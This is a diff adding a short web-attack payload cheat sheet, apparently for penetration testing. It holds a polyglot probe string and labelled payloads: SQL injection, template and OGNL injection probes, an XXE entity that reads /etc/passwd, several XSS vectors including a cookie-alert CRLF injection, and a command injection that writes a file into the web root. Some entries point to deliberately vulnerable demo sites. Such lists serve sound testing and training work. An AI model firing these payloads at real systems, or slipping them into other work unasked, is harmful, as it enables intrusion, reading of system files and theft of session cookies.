@@ -1,1 +1,11 @@
-<?xml version="1.0" encoding="UTF-8" ?><!-- 'or 1=1--><!-- "><%=7*7%>{{7*7}} --><!DOCTYPE test [ <!ENTITY x SYSTEM "file:///etc/passwd">]><stockCheck><productId>&x;</productId><storeId>1</storeId><![CDATA[<s><svg/onload=prompt(5);>]]></stockCheck>
+<?xml version="1.0" encoding="UTF-8" ?><!-- 'or 1=1--><!-- "><%=7*7%>{{7*7}}%{48+1} --><!DOCTYPE test [ <!ENTITY x SYSTEM "file:///etc/passwd">]><stockCheck><productId>&x;</productId><storeId>1</storeId><![CDATA[<s><svg/onload=prompt(5);>]]></stockCheck>
+SQLi:'or 1=1--><!-- [http://demo.testfire.net/login.jsp]
+SSTI:<%=7*7%>{{7*7}} 
+OGNL injection:%{48+1}
+XXE: <?xml version="1.0" encoding="UTF-8" ?><!DOCTYPE test [ <!ENTITY x SYSTEM "file:///etc/passwd">]><stockCheck><productId>&x;</productId><storeId>1</storeId><![CDATA[<s>]]></stockCheck>
+XSS:<svg/onload=prompt(5);> [http://demo.testfire.net/search.jsp?query=%3Csvg%2Fonload%3Dprompt%285%29%3B%3E] [https://portswigger-labs.net/xss/xss.php?x=%3Csvg/onload=prompt(5);%3E]
+
+SSTI:{{define "T1"}}<script>alert(1)</script>{{end}} {{template "T1"}}
+Command injection: ;echo "<svg/onload=alert(1)>" > /var/www/html/x.html;# xx 1/n
+CRLF to XSS: %0d%0aX-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0a%0d%0a%3Chtml%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E%3C%21--
+XSS:<details+ontoggle=alert(1)>щ#:~:text=щ [https://portswigger-labs.net/xss/xss.php?x=%3Cdetails+ontoggle=write(1)%3E%D1%89#:~:text=%D1%89]
